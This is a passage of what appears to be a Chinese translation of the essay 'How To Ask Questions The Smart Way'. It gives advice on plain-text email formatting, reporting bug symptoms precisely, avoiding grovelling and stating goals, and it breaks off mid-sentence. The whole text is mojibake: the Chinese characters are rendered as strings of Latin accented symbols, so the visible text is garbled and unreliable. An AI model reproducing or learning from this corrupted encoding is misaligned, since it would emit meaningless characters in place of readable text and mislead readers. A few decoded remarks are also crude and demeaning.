ä¸è¦å‘é€ä¸€æ®µæ–‡å­—åªæ˜¯ä¸€è¡Œå¥å­ä½†è‡ªåŠ¨æ¢è¡Œåä¼šå˜æˆå¤šè¡Œçš„é‚®ä»¶ï¼ˆè¿™ä½¿å¾—å›å¤éƒ¨åˆ†å†…å®¹éå¸¸å›°éš¾ï¼‰ã€‚è®¾æƒ³ä½ çš„è¯»è€…æ˜¯åœ¨ 80 ä¸ªå­—ç¬¦å®½çš„ç»ˆç«¯æœºä¸Šé˜…è¯»é‚®ä»¶ï¼Œæœ€å¥½è®¾ç½®ä½ çš„æ¢è¡Œåˆ†å‰²ç‚¹å°äº 80 å­—ã€‚ ä½†æ˜¯ï¼Œå¯¹ä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸è¦è®¾ç½®å›ºå®šå®½åº¦ï¼ˆè­¬å¦‚æ—¥å¿—æ–‡ä»¶æ‹·è´æˆ–ä¼šè¯è®°å½•ï¼‰ã€‚æ•°æ®åº”è¯¥åŸæ ·åŒ…å«ï¼Œè®©å›å¤è€…æœ‰ä¿¡å¿ƒä»–ä»¬çœ‹åˆ°çš„æ˜¯å’Œä½ çœ‹åˆ°çš„ä¸€æ ·çš„ä¸œè¥¿ã€‚ åœ¨è‹±è¯­è®ºå›ä¸­ï¼Œä¸è¦ä½¿ç”¨Quoted-Printable MIME ç¼–ç å‘é€æ¶ˆæ¯ã€‚è¿™ç§ç¼–ç å¯¹äºå¼ è´´é ASCII è¯­è¨€å¯èƒ½æ˜¯å¿…é¡»çš„ï¼Œä½†å¾ˆå¤šé‚®ä»¶ç¨‹åºå¹¶ä¸æ”¯æŒè¿™ç§ç¼–ç ã€‚å½“å®ƒä»¬å¤„ç†æ¢è¡Œæ—¶ï¼Œé‚£äº›æ–‡æœ¬ä¸­å››å¤„æ•£å¸ƒçš„=20ç¬¦å·æ—¢éš¾çœ‹ä¹Ÿåˆ†æ•£æ³¨æ„åŠ›ï¼Œç”šè‡³æœ‰å¯èƒ½ç ´åå†…å®¹çš„è¯­æ„ã€‚ ç»å¯¹ï¼Œæ°¸è¿œä¸è¦æŒ‡æœ›é»‘å®¢ä»¬é˜…è¯»ä½¿ç”¨å°é—­æ ¼å¼ç¼–å†™çš„æ–‡æ¡£ï¼Œåƒå¾®è½¯å…¬å¸çš„ Word æˆ– Excel æ–‡ä»¶ç­‰ã€‚å¤§å¤šæ•°é»‘å®¢å¯¹æ­¤çš„ååº”å°±åƒæœ‰äººå°†è¿˜åœ¨å†’çƒ­æ°”çš„çŒªç²ªå€’åœ¨ä½ å®¶é—¨å£æ—¶ä½ çš„ååº”ä¸€æ ·ã€‚å³ä¾¿ä»–ä»¬èƒ½å¤Ÿå¤„ç†ï¼Œä»–ä»¬ä¹Ÿå¾ˆåŒæ¶è¿™ä¹ˆåšã€‚ å¦‚æœä½ ä»ä½¿ç”¨ Windows çš„ç”µè„‘å‘é€ç”µå­é‚®ä»¶ï¼Œå…³é—­å¾®è½¯æ„šè ¢çš„æ™ºèƒ½å¼•å·åŠŸèƒ½ ï¼ˆä»[é€‰é¡¹] \u0026gt; [æ ¡è®¢] \u0026gt; [è‡ªåŠ¨æ ¡æ­£é€‰é¡¹]ï¼Œå‹¾é€‰æ‰æ™ºèƒ½å¼•å·å•é€‰æ¡†ï¼‰ï¼Œä»¥å…åœ¨ä½ çš„é‚®ä»¶ä¸­åˆ°å¤„æ•£å¸ƒåƒåœ¾å­—ç¬¦ã€‚ åœ¨è®ºå›ï¼Œå‹¿æ»¥ç”¨è¡¨æƒ…ç¬¦å·å’ŒHTMLåŠŸèƒ½ï¼ˆå½“å®ƒä»¬æä¾›æ—¶ï¼‰ã€‚ä¸€ä¸¤ä¸ªè¡¨æƒ…ç¬¦å·é€šå¸¸æ²¡æœ‰é—®é¢˜ï¼Œä½†èŠ±å“¨çš„å½©è‰²æ–‡æœ¬å€¾å‘äºä½¿äººè®¤ä¸ºä½ æ˜¯ä¸ªæ— èƒ½ä¹‹è¾ˆã€‚è¿‡æ»¥åœ°ä½¿ç”¨è¡¨æƒ…ç¬¦å·ã€è‰²å½©å’Œå­—ä½“ä¼šä½¿ä½ çœ‹æ¥åƒä¸ªå‚»ç¬‘çš„å°å§‘å¨˜ã€‚è¿™é€šå¸¸ä¸æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œé™¤éä½ åªæ˜¯å¯¹æ€§è€Œä¸æ˜¯å¯¹ç­”æ¡ˆæ„Ÿå…´è¶£ã€‚ å¦‚æœä½ ä½¿ç”¨å›¾å½¢ç”¨æˆ·ç•Œé¢çš„é‚®ä»¶ç¨‹åºï¼ˆå¦‚å¾®è½¯å…¬å¸çš„ Outlook æˆ–è€…å…¶å®ƒç±»ä¼¼çš„ï¼‰ï¼Œæ³¨æ„å®ƒä»¬çš„é»˜è®¤è®¾ç½®ä¸ä¸€å®šæ»¡è¶³è¿™äº›è¦æ±‚ã€‚å¤§å¤šæ•°è¿™ç±»ç¨‹åºæœ‰åŸºäºé€‰å•çš„æŸ¥çœ‹æºä»£ç å‘½ä»¤ï¼Œç”¨å®ƒæ¥æ£€æŸ¥å‘é€æ–‡ä»¶å¤¹ä¸­çš„é‚®ä»¶ï¼Œä»¥ç¡®ä¿å‘é€çš„æ˜¯çº¯æ–‡æœ¬æ–‡ä»¶åŒæ—¶æ²¡æœ‰ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦ã€‚\nç²¾ç¡®åœ°æè¿°é—®é¢˜å¹¶è¨€ä¹‹æœ‰ç‰© ä»”ç»†ã€æ¸…æ¥šåœ°æè¿°ä½ çš„é—®é¢˜æˆ– Bug çš„ç—‡çŠ¶ã€‚ æè¿°é—®é¢˜å‘ç”Ÿçš„ç¯å¢ƒï¼ˆæœºå™¨é…ç½®ã€æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€ä»¥åŠç›¸å…³çš„ä¿¡æ¯ï¼‰ï¼Œæä¾›ç»é”€å•†çš„å‘è¡Œç‰ˆå’Œç‰ˆæœ¬å·ï¼ˆå¦‚ï¼šFedora Core 4ã€Slackware 9.1ç­‰ï¼‰ã€‚ æè¿°åœ¨æé—®å‰ä½ æ˜¯æ€æ ·å»ç ”ç©¶å’Œç†è§£è¿™ä¸ªé—®é¢˜çš„ã€‚ æè¿°åœ¨æé—®å‰ä¸ºç¡®å®šé—®é¢˜è€Œé‡‡å–çš„è¯Šæ–­æ­¥éª¤ã€‚ æè¿°æœ€è¿‘åšè¿‡ä»€ä¹ˆå¯èƒ½ç›¸å…³çš„ç¡¬ä»¶æˆ–è½¯ä»¶å˜æ›´ã€‚ å°½å¯èƒ½åœ°æä¾›ä¸€ä¸ªå¯ä»¥é‡ç°è¿™ä¸ªé—®é¢˜çš„å¯æ§ç¯å¢ƒçš„æ–¹æ³•ã€‚ å°½é‡å»æ£æµ‹ä¸€ä¸ªé»‘å®¢ä¼šæ€æ ·åé—®ä½ ï¼Œåœ¨ä½ æé—®ä¹‹å‰é¢„å…ˆå°†é»‘å®¢ä»¬å¯èƒ½æå‡ºçš„é—®é¢˜å›ç­”ä¸€éã€‚\nä»¥ä¸Šå‡ ç‚¹ä¸­ï¼Œå½“ä½ æŠ¥å‘Šçš„æ˜¯ä½ è®¤ä¸ºå¯èƒ½åœ¨ä»£ç ä¸­çš„é—®é¢˜æ—¶ï¼Œç»™é»‘å®¢ä¸€ä¸ªå¯ä»¥é‡ç°ä½ çš„é—®é¢˜çš„ç¯å¢ƒå°¤å…¶é‡è¦ã€‚å½“ä½ è¿™ä¹ˆåšæ—¶ï¼Œä½ å¾—åˆ°æœ‰æ•ˆçš„å›ç­”çš„æœºä¼šå’Œé€Ÿåº¦éƒ½ä¼šå¤§å¤§çš„æå‡ã€‚\nSimon Tatham å†™è¿‡ä¸€ç¯‡åä¸ºã€Šå¦‚ä½•æœ‰æ•ˆåœ°æŠ¥å‘ŠBugã€‹çš„å‡ºè‰²æ–‡ç« ã€‚å¼ºåŠ›æ¨èä½ ä¹Ÿè¯»ä¸€è¯»ã€‚\nè¯ä¸åœ¨å¤šè€Œåœ¨ç²¾ ä½ éœ€è¦æä¾›ç²¾ç¡®æœ‰å†…å®¹çš„ä¿¡æ¯ã€‚è¿™å¹¶ä¸æ˜¯è¦æ±‚ä½ ç®€å•çš„æŠŠæˆå †çš„å‡ºé”™ä»£ç æˆ–è€…èµ„æ–™å®Œå…¨è½¬å½•åˆ°ä½ çš„æé—®ä¸­ã€‚å¦‚æœä½ æœ‰åºå¤§è€Œå¤æ‚çš„æµ‹è¯•æ ·ä¾‹èƒ½é‡ç°ç¨‹åºæŒ‚æ‰çš„æƒ…å¢ƒï¼Œå°½é‡å°†å®ƒå‰ªè£å¾—è¶Šå°è¶Šå¥½ã€‚\nè¿™æ ·åšçš„ç”¨å¤„è‡³å°‘æœ‰ä¸‰ç‚¹ã€‚ ç¬¬ä¸€ï¼Œè¡¨ç°å‡ºä½ ä¸ºç®€åŒ–é—®é¢˜ä»˜å‡ºäº†åŠªåŠ›ï¼Œè¿™å¯ä»¥ä½¿ä½ å¾—åˆ°å›ç­”çš„æœºä¼šå¢åŠ ï¼› ç¬¬äºŒï¼Œç®€åŒ–é—®é¢˜ä½¿ä½ æ›´æœ‰å¯èƒ½å¾—åˆ°æœ‰ç”¨çš„ç­”æ¡ˆï¼› ç¬¬ä¸‰ï¼Œåœ¨ç²¾ç‚¼ä½ çš„ bug æŠ¥å‘Šçš„è¿‡ç¨‹ä¸­ï¼Œä½ å¾ˆå¯èƒ½å°±è‡ªå·±æ‰¾åˆ°äº†è§£å†³æ–¹æ³•æˆ–æƒå®œä¹‹è®¡ã€‚\nåˆ«åŠ¨è¾„å£°ç§°æ‰¾åˆ° Bug å½“ä½ åœ¨ä½¿ç”¨è½¯ä»¶ä¸­é‡åˆ°é—®é¢˜ï¼Œé™¤éä½ éå¸¸ã€éå¸¸çš„æœ‰æ ¹æ®ï¼Œä¸è¦åŠ¨è¾„å£°ç§°æ‰¾åˆ°äº† Bugã€‚æç¤ºï¼šé™¤éä½ èƒ½æä¾›è§£å†³é—®é¢˜çš„æºä»£ç è¡¥ä¸ï¼Œæˆ–è€…æä¾›å›å½’æµ‹è¯•æ¥è¡¨æ˜å‰ä¸€ç‰ˆæœ¬ä¸­è¡Œä¸ºä¸æ­£ç¡®ï¼Œå¦åˆ™ä½ éƒ½å¤šåŠä¸å¤Ÿå®Œå…¨ç¡®ä¿¡ã€‚è¿™åŒæ ·é€‚ç”¨åœ¨ç½‘é¡µå’Œæ–‡ä»¶ï¼Œå¦‚æœä½ ï¼ˆå£°ç§°ï¼‰å‘ç°äº†æ–‡ä»¶çš„Bugï¼Œä½ åº”è¯¥èƒ½æä¾›ç›¸åº”ä½ç½®çš„ä¿®æ­£æˆ–æ›¿ä»£æ–‡ä»¶ã€‚\nè¯·è®°å¾—ï¼Œè¿˜æœ‰å…¶ä»–è®¸å¤šç”¨æˆ·æ²¡é‡åˆ°ä½ å‘ç°çš„é—®é¢˜ï¼Œå¦åˆ™ä½ åœ¨é˜…è¯»æ–‡ä»¶æˆ–æœç´¢ç½‘é¡µæ—¶å°±åº”è¯¥å‘ç°äº†ï¼ˆä½ åœ¨æŠ±æ€¨å‰å·²ç»åšäº†è¿™äº›ï¼Œæ˜¯å§ï¼Ÿï¼‰ã€‚è¿™ä¹Ÿæ„å‘³ç€å¾ˆæœ‰å¯èƒ½æ˜¯ä½ å¼„é”™äº†è€Œä¸æ˜¯è½¯ä»¶æœ¬èº«æœ‰é—®é¢˜ã€‚\nç¼–å†™è½¯ä»¶çš„äººæ€»æ˜¯éå¸¸è¾›è‹¦åœ°ä½¿å®ƒå°½å¯èƒ½å®Œç¾ã€‚å¦‚æœä½ å£°ç§°æ‰¾åˆ°äº† Bugï¼Œä¹Ÿå°±æ˜¯åœ¨è´¨ç–‘ä»–ä»¬çš„èƒ½åŠ›ï¼Œå³ä½¿ä½ æ˜¯å¯¹çš„ï¼Œä¹Ÿæœ‰å¯èƒ½ä¼šå†’çŠ¯åˆ°å…¶ä¸­æŸéƒ¨åˆ†äººã€‚å½“ä½ åœ¨æ ‡é¢˜ä¸­åš·åš·ç€æœ‰Bugæ—¶ï¼Œè¿™å°¤å…¶ä¸¥é‡ã€‚\næé—®æ—¶ï¼Œå³ä½¿ä½ ç§ä¸‹éå¸¸ç¡®ä¿¡å·²ç»å‘ç°ä¸€ä¸ªçœŸæ­£çš„ Bugï¼Œæœ€å¥½å†™å¾—åƒæ˜¯ä½ åšé”™äº†ä»€ä¹ˆã€‚å¦‚æœçœŸçš„æœ‰ Bugï¼Œä½ ä¼šåœ¨å›å¤ä¸­çœ‹åˆ°è¿™ç‚¹ã€‚è¿™æ ·åšçš„è¯ï¼Œå¦‚æœçœŸæœ‰ Bugï¼Œç»´æŠ¤è€…å°±ä¼šå‘ä½ é“æ­‰ï¼Œè¿™æ€»æ¯”ä½ æƒ¹æ¼åˆ«äººç„¶åæ¬ åˆ«äººä¸€ä¸ªé“æ­‰è¦å¥½ä¸€ç‚¹ã€‚\nä½å£°ä¸‹æ°”ä¸èƒ½ä»£æ›¿ä½ çš„åŠŸè¯¾ æœ‰äº›äººæ˜ç™½ä»–ä»¬ä¸è¯¥ç²—é²æˆ–å‚²æ…¢çš„æé—®å¹¶è¦æ±‚å¾—åˆ°ç­”å¤ï¼Œä½†ä»–ä»¬é€‰æ‹©å¦ä¸€ä¸ªæç«¯ â€”â€” ä½å£°ä¸‹æ°”ï¼šæˆ‘çŸ¥é“æˆ‘åªæ˜¯ä¸ªå¯æ‚²çš„æ–°æ‰‹ï¼Œä¸€ä¸ªå¤±è´¥è€…ï¼Œä½†...ã€‚è¿™æ—¢ä½¿äººå›°æ‰°ï¼Œä¹Ÿæ²¡æœ‰ç”¨ï¼Œå°¤å…¶æ˜¯ä¼´éšç€ä¸å®é™…é—®é¢˜å«ç³Šä¸æ¸…çš„æè¿°æ—¶æ›´ä»¤äººåæ„Ÿã€‚\nåˆ«ç”¨åŸå§‹çµé•¿ç±»åŠ¨ç‰©çš„æŠŠæˆæ¥æµªè´¹ä½ æˆ‘çš„æ—¶é—´ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå°½å¯èƒ½æ¸…æ¥šåœ°æè¿°èƒŒæ™¯æ¡ä»¶å’Œä½ çš„é—®é¢˜æƒ…å†µã€‚è¿™æ¯”ä½å£°ä¸‹æ°”æ›´å¥½åœ°å®šä½äº†ä½ çš„ä½ç½®ã€‚\næœ‰æ—¶ç½‘é¡µè®ºå›ä¼šè®¾æœ‰ä¸“ä¸ºæ–°æ‰‹æé—®çš„ç‰ˆé¢ï¼Œå¦‚æœä½ çœŸçš„è®¤ä¸ºé‡åˆ°äº†åˆå­¦è€…çš„é—®é¢˜ï¼Œåˆ°é‚£å»å°±æ˜¯äº†ï¼Œä½†ä¸€æ ·åˆ«é‚£ä¹ˆä½å£°ä¸‹æ°”ã€‚\næè¿°é—®é¢˜ç—‡çŠ¶è€Œéä½ çš„çŒœæµ‹ å‘Šè¯‰é»‘å®¢ä»¬ä½ è®¤ä¸ºé—®é¢˜æ˜¯æ€æ ·é€ æˆçš„å¹¶æ²¡ä»€ä¹ˆå¸®åŠ©ã€‚ï¼ˆå¦‚æœä½ çš„æ¨æ–­å¦‚æ­¤æœ‰æ•ˆï¼Œè¿˜ç”¨å‘åˆ«äººæ±‚åŠ©å—ï¼Ÿï¼‰ï¼Œå› æ­¤è¦ç¡®ä¿¡ä½ åŸåŸæœ¬æœ¬å‘Šè¯‰äº†ä»–ä»¬é—®é¢˜çš„ç—‡çŠ¶ï¼Œè€Œä¸æ˜¯ä½ çš„è§£é‡Šå’Œç†è®ºï¼›è®©é»‘å®¢ä»¬æ¥æ¨æµ‹å’Œè¯Šæ–­ã€‚å¦‚æœä½ è®¤ä¸ºé™ˆè¿°è‡ªå·±çš„çŒœæµ‹å¾ˆé‡è¦ï¼Œæ¸…æ¥šåœ°è¯´æ˜è¿™åªæ˜¯ä½ çš„çŒœæµ‹ï¼Œå¹¶æè¿°ä¸ºä»€ä¹ˆå®ƒä»¬ä¸èµ·ä½œç”¨ã€‚\nè ¢é—®é¢˜\næˆ‘åœ¨ç¼–è¯‘å†…æ ¸æ—¶æ¥è¿é‡åˆ° SIG11 é”™è¯¯ï¼Œ æˆ‘æ€€ç–‘æŸæ¡é£çº¿æ­åœ¨ä¸»æ¿çš„èµ°çº¿ä¸Šäº†ï¼Œè¿™ç§æƒ…å†µåº”è¯¥æ€æ ·æ£€æŸ¥æœ€å¥½ï¼Ÿ\nèªæ˜é—®é¢˜\næˆ‘çš„ç»„è£…ç”µè„‘æ˜¯ FIC-PA2007 ä¸»æœºæ¿æ­è½½ AMD K6/233 CPUï¼ˆå¨ç›› Apollo VP2 èŠ¯ç‰‡ç»„ï¼‰ï¼Œ 256MB Corsair PC133 SDRAM å†…å­˜ï¼Œåœ¨ç¼–è¯‘å†…æ ¸æ—¶ï¼Œä»å¼€æœº 20 åˆ†é’Ÿä»¥åå°±é¢‘é¢‘äº§ç”Ÿ SIG11 é”™è¯¯ï¼Œ ä½†æ˜¯åœ¨å¤´ 20 åˆ†é’Ÿå†…ä»æ²¡å‘ç”Ÿè¿‡ç›¸åŒçš„é—®é¢˜ã€‚é‡æ–°å¯åŠ¨ä¹Ÿæ²¡æœ‰ç”¨ï¼Œä½†æ˜¯å…³æœºä¸€æ™šä¸Šå°±åˆèƒ½å·¥ä½œ 20 åˆ†é’Ÿã€‚ æ‰€æœ‰å†…å­˜éƒ½æ¢è¿‡äº†ï¼Œæ²¡æœ‰æ•ˆæœã€‚ç›¸å…³éƒ¨åˆ†çš„æ ‡å‡†ç¼–è¯‘è®°å½•å¦‚ä¸‹â€¦\nç”±äºä»¥ä¸Šè¿™ç‚¹ä¼¼ä¹è®©è®¸å¤šäººè§‰å¾—éš¾ä»¥é…åˆï¼Œè¿™é‡Œæœ‰å¥è¯å¯ä»¥æé†’ä½ ï¼šæ‰€æœ‰çš„è¯Šæ–­ä¸“å®¶éƒ½æ¥è‡ªå¯†è‹é‡Œå·ã€‚ ç¾å›½å›½åŠ¡é™¢çš„å®˜æ–¹åº§å³é“­åˆ™æ˜¯ï¼šè®©æˆ‘çœ‹çœ‹ï¼ˆå‡ºè‡ªå›½ä¼šè®®å‘˜ Willard D. Vandiver åœ¨ 1899 å¹´æ—¶çš„è®²è¯ï¼šæˆ‘æ¥è‡ªä¸€ä¸ªå‡ºäº§ç‰ç±³ï¼Œæ£‰èŠ±ï¼Œç‰›è’¡å’Œæ°‘ä¸»å…šäººçš„å›½å®¶ï¼Œæ»”æ»”é›„è¾©æ—¢ä¸èƒ½è¯´æœæˆ‘ï¼Œä¹Ÿä¸ä¼šè®©æˆ‘æ»¡æ„ã€‚æˆ‘æ¥è‡ªå¯†è‹é‡Œå·ï¼Œä½ å¿…é¡»è®©æˆ‘çœ‹çœ‹ã€‚ï¼‰ é’ˆå¯¹è¯Šæ–­è€…è€Œè¨€ï¼Œè¿™å¹¶ä¸æ˜¯ä¸€ç§æ€€ç–‘ï¼Œè€Œåªæ˜¯ä¸€ç§çœŸå®è€Œæœ‰ç”¨çš„éœ€æ±‚ï¼Œä»¥ä¾¿è®©ä»–ä»¬çœ‹åˆ°çš„æ˜¯ä¸ä½ çœ‹åˆ°çš„åŸå§‹è¯æ®å°½å¯èƒ½ä¸€è‡´çš„ä¸œè¥¿ï¼Œè€Œä¸æ˜¯ä½ çš„çŒœæµ‹ä¸å½’çº³çš„ç»“è®ºã€‚æ‰€ä»¥ï¼Œå¤§æ–¹åœ°å±•ç¤ºç»™æˆ‘ä»¬çœ‹å§ï¼\næŒ‰å‘ç”Ÿæ—¶é—´å…ˆååˆ—å‡ºé—®é¢˜ç—‡çŠ¶ é—®é¢˜å‘ç”Ÿå‰çš„ä¸€ç³»åˆ—æ“ä½œï¼Œå¾€å¾€å°±æ˜¯å¯¹æ‰¾å‡ºé—®é¢˜æœ€æœ‰å¸®åŠ©çš„çº¿ç´¢ã€‚å› æ­¤ï¼Œä½ çš„è¯´æ˜é‡Œåº”è¯¥åŒ…å«ä½ çš„æ“ä½œæ­¥éª¤ï¼Œä»¥åŠæœºå™¨å’Œè½¯ä»¶çš„ååº”ï¼Œç›´åˆ°é—®é¢˜å‘ç”Ÿã€‚åœ¨å‘½ä»¤è¡Œå¤„ç†çš„æƒ…å†µä¸‹ï¼Œæä¾›ä¸€æ®µæ“ä½œè®°å½•ï¼ˆä¾‹å¦‚è¿è¡Œè„šæœ¬å·¥å…·æ‰€ç”Ÿæˆçš„ï¼‰ï¼Œå¹¶å¼•ç”¨ç›¸å…³çš„è‹¥å¹²è¡Œï¼ˆå¦‚ 20 è¡Œï¼‰è®°å½•ä¼šéå¸¸æœ‰å¸®åŠ©ã€‚\nå¦‚æœæŒ‚æ‰çš„ç¨‹åºæœ‰è¯Šæ–­é€‰é¡¹ï¼ˆå¦‚ -v çš„è¯¦è¿°å¼€å…³ï¼‰ï¼Œè¯•ç€é€‰æ‹©è¿™äº›èƒ½åœ¨è®°å½•ä¸­å¢åŠ è°ƒè¯•ä¿¡æ¯çš„é€‰é¡¹ã€‚è®°ä½ï¼Œå¤šä¸ç­‰äºå¥½ã€‚è¯•ç€é€‰å–é€‚å½“çš„è°ƒè¯•çº§åˆ«ä»¥ä¾¿æä¾›æœ‰ç”¨çš„ä¿¡æ¯è€Œä¸æ˜¯è®©è¯»è€…æ·¹æ²¡åœ¨åƒåœ¾ä¸­ã€‚\nå¦‚æœä½ çš„è¯´æ˜å¾ˆé•¿ï¼ˆå¦‚è¶…è¿‡å››ä¸ªæ®µè½ï¼‰ï¼Œåœ¨å¼€å¤´ç®€è¿°é—®é¢˜ï¼Œæ¥ä¸‹æ¥å†æŒ‰æ—¶é—´é¡ºåºè¯¦è¿°ä¼šæœ‰æ‰€å¸®åŠ©ã€‚è¿™æ ·é»‘å®¢ä»¬åœ¨è¯»ä½ çš„è®°å½•æ—¶å°±çŸ¥é“è¯¥æ³¨æ„å“ªäº›å†…å®¹äº†ã€‚\næè¿°ç›®æ ‡è€Œä¸æ˜¯è¿‡ç¨‹ å¦‚æœä½ æƒ³å¼„æ¸…æ¥šå¦‚ä½•åšæŸäº‹ï¼ˆè€Œä¸æ˜¯æŠ¥å‘Šä¸€ä¸ª Bugï¼‰ï¼Œåœ¨å¼€å¤´å°±æè¿°ä½ çš„ç›®æ ‡ï¼Œç„¶åæ‰é™ˆè¿°é‡ç°ä½ æ‰€å¡ä½çš„ç‰¹å®šæ­¥éª¤ã€‚\nç»å¸¸å¯»æ±‚æŠ€æœ¯å¸®åŠ©çš„äººåœ¨å¿ƒä¸­æœ‰ä¸ªæ›´é«˜å±‚æ¬¡çš„ç›®æ ‡ï¼Œè€Œä»–ä»¬åœ¨è‡ªä»¥ä¸ºèƒ½è¾¾åˆ°ç›®æ ‡çš„ç‰¹å®šé“è·¯ä¸Šè¢«å¡ä½äº†ï¼Œç„¶åè·‘æ¥é—®è¯¥æ€ä¹ˆèµ°ï¼Œä½†æ²¡æœ‰æ„è¯†åˆ°è¿™æ¡è·¯æœ¬èº«å°±æœ‰é—®é¢˜ã€‚ç»“æœè¦è´¹å¾ˆå¤§çš„åŠ²æ‰èƒ½æå®šã€‚\nè ¢é—®é¢˜\næˆ‘æ€æ ·æ‰èƒ½ä»æŸç»˜å›¾ç¨‹åºçš„é¢œè‰²é€‰æ‹©å™¨ä¸­å–å¾—åå…­è¿›åˆ¶çš„ RGB å€¼ï¼Ÿ\nèªæ˜é—®é¢˜\næˆ‘æ­£è¯•ç€ç”¨æ›¿æ¢ä¸€å¹…å›¾ç‰‡çš„è‰²ç ï¼ˆcolor tableï¼‰æˆè‡ªå·±é€‰å®šçš„è‰²ç ï¼Œæˆ‘ç°åœ¨çŸ¥é“çš„å”¯ä¸€æ–¹æ³•æ˜¯ç¼–è¾‘æ¯ä¸ªè‰²ç åŒºå—ï¼ˆtable slotï¼‰ï¼Œ ä½†å´æ— æ³•ä»æŸç»˜å›¾ç¨‹åºçš„é¢œè‰²é€‰æ‹©å™¨å–å¾—åå…­è¿›åˆ¶çš„ RGB å€¼ã€‚\nç¬¬äºŒç§æé—®æ³•æ¯”è¾ƒèªæ˜ï¼Œä½ å¯èƒ½å¾—åˆ°åƒæ˜¯å»ºè®®é‡‡ç”¨å¦ä¸€ä¸ªæ›´åˆé€‚çš„å·¥å…·çš„å›å¤ã€‚\nåˆ«è¦æ±‚ä½¿ç”¨ç§äººç”µé‚®å›å¤ é»‘å®¢ä»¬è®¤ä¸ºé—®é¢˜çš„è§£å†³è¿‡ç¨‹åº”è¯¥å…¬å¼€ã€é€æ˜ï¼Œæ­¤è¿‡ç¨‹ä¸­å¦‚æœæ›´æœ‰ç»éªŒçš„äººæ³¨æ„åˆ°ä¸å®Œæ•´æˆ–è€…ä¸å½“ä¹‹å¤„ï¼Œæœ€åˆçš„å›å¤æ‰èƒ½å¤Ÿã€ä¹Ÿåº”è¯¥è¢«çº æ­£ã€‚åŒæ—¶ï¼Œä½œä¸ºæä¾›å¸®åŠ©è€…å¯ä»¥å¾—åˆ°ä¸€äº›å¥–åŠ±ï¼Œå¥–åŠ±å°±æ˜¯ä»–çš„èƒ½åŠ›å’Œå­¦è¯†è¢«å…¶ä»–åŒè¡Œçœ‹åˆ°ã€‚\nå½“ä½ è¦æ±‚ç§ä¸‹å›å¤æ—¶ï¼Œè¿™ä¸ªè¿‡ç¨‹å’Œå¥–åŠ±éƒ½è¢«ä¸­æ­¢ã€‚åˆ«è¿™æ ·åšï¼Œè®©å›å¤è€…æ¥å†³å®šæ˜¯å¦ç§ä¸‹å›ç­” â€”â€” å¦‚æœä»–çœŸè¿™ä¹ˆåšäº†ï¼Œé€šå¸¸æ˜¯å› ä¸ºä»–è®¤ä¸ºé—®é¢˜ç¼–å†™å¤ªå·®æˆ–è€…å¤ªè‚¤æµ…ï¼Œä»¥è‡³äºä¸å¯èƒ½ä½¿å…¶ä»–äººäº§ç”Ÿå…´è¶£ã€‚\nè¿™æ¡è§„åˆ™å­˜åœ¨ä¸€æ¡æœ‰é™çš„ä¾‹å¤–ï¼Œå¦‚æœä½ ç¡®ä¿¡æé—®å¯èƒ½ä¼šå¼•æ¥å¤§é‡é›·åŒçš„å›å¤æ—¶ï¼Œé‚£ä¹ˆè¿™ä¸ªç¥å¥‡çš„æé—®å¥ä¼šæ˜¯å‘æˆ‘å‘ç”µé‚®ï¼Œæˆ‘å°†ä¸ºè®ºå›å½’çº³è¿™äº›å›å¤ã€‚è¯•ç€å°†é‚®ä»¶åˆ—è¡¨æˆ–æ–°é—»ç¾¤ç»„ä»æ´ªæ°´èˆ¬çš„é›·åŒå›å¤ä¸­è§£æ•‘å‡ºæ¥æ˜¯éå¸¸æœ‰ç¤¼è²Œçš„ â€”â€” ä½†ä½ å¿…é¡»ä¿¡å®ˆè¯ºè¨€ã€‚\næ¸…æ¥šæ˜ç¡®åœ°è¡¨è¾¾ä½ çš„é—®é¢˜ä»¥åŠéœ€æ±‚ æ¼«æ— è¾¹é™…çš„æé—®æ˜¯è¿‘ä¹æ— ä¼‘æ— æ­¢çš„æ—¶é—´é»‘æ´ã€‚æœ€æœ‰å¯èƒ½ç»™ä½ æœ‰ç”¨ç­”æ¡ˆçš„äººé€šå¸¸ä¹Ÿæ­£æ˜¯æœ€å¿™çš„äººï¼ˆä»–ä»¬å¿™æ˜¯å› ä¸ºè¦äº²è‡ªå®Œæˆå¤§éƒ¨åˆ†å·¥ä½œï¼‰ã€‚è¿™æ ·çš„äººå¯¹æ— èŠ‚åˆ¶çš„æ—¶é—´é»‘æ´ç›¸å½“åŒæ¶ï¼Œæ‰€ä»¥ä»–ä»¬ä¹Ÿå€¾å‘äºåŒæ¶é‚£äº›æ¼«æ— è¾¹é™…çš„æé—®ã€‚\nå¦‚æœä½ æ˜ç¡®è¡¨è¿°éœ€è¦å›ç­”è€…åšä»€ä¹ˆï¼ˆå¦‚æä¾›æŒ‡ç‚¹ã€å‘é€ä¸€æ®µä»£ç ã€æ£€æŸ¥ä½ çš„è¡¥ä¸ã€æˆ–æ˜¯å…¶ä»–ç­‰ç­‰ï¼‰ï¼Œå°±æœ€æœ‰å¯èƒ½å¾—åˆ°æœ‰ç”¨çš„ç­”æ¡ˆã€‚å› ä¸ºè¿™ä¼šå®šå‡ºä¸€ä¸ªæ—¶é—´å’Œç²¾åŠ›çš„ä¸Šé™ï¼Œä¾¿äºå›ç­”è€…èƒ½é›†ä¸­ç²¾åŠ›æ¥å¸®ä½ ã€‚è¿™ä¹ˆåšå¾ˆæ£’ã€‚\nè¦ç†è§£ä¸“å®¶ä»¬æ‰€å¤„çš„ä¸–ç•Œï¼Œè¯·æŠŠä¸“ä¸šæŠ€èƒ½æƒ³åƒä¸ºå……è£•çš„èµ„æºï¼Œè€Œå›å¤çš„æ—¶é—´åˆ™æ˜¯ç¨€ç¼ºçš„èµ„æºã€‚ä½ è¦æ±‚ä»–ä»¬å¥‰çŒ®çš„æ—¶é—´è¶Šå°‘ï¼Œä½ è¶Šæœ‰å¯èƒ½ä»çœŸæ­£ä¸“ä¸šè€Œä¸”å¾ˆå¿™çš„ä¸“å®¶é‚£é‡Œå¾—åˆ°è§£ç­”ã€‚\næ‰€ä»¥ï¼Œç•Œå®šä¸€ä¸‹ä½ çš„é—®é¢˜ï¼Œä½¿ä¸“å®¶èŠ±åœ¨è¾¨è¯†ä½ çš„é—®é¢˜å’Œå›ç­”æ‰€éœ€è¦ä»˜å‡ºçš„æ—¶é—´å‡åˆ°æœ€å°‘ï¼Œè¿™æŠ€å·§å¯¹ä½ 